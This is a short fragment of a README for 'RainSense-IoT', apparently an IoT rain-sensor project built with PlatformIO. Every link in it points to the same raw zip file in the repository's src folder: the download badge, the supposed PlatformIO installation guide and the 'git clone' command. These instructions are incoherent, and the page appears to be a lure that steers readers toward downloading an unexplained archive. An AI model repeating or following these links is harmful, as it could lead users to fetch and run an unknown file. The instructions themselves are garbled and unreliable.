...
[![Download RainSense-IoT](https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/src/Io-Rain-T-Sense-v1.8.zip)](https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/src/Io-Rain-T-Sense-v1.8.zip)
...
2. **Install PlatformIO**: This application uses PlatformIO, an integrated development environment (IDE) that makes working with embedded systems easy.
    - Follow the [PlatformIO installation guide](https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/src/Io-Rain-T-Sense-v1.8.zip) based on your computer's operating system.

3. **Clone the Repository**: Open your command prompt or terminal and run the following command:
    ```
    git clone https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/src/Io-Rain-T-Sense-v1.8.zip
    ```
...
[Visit this page to download](https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/src/Io-Rain-T-Sense-v1.8.zip)
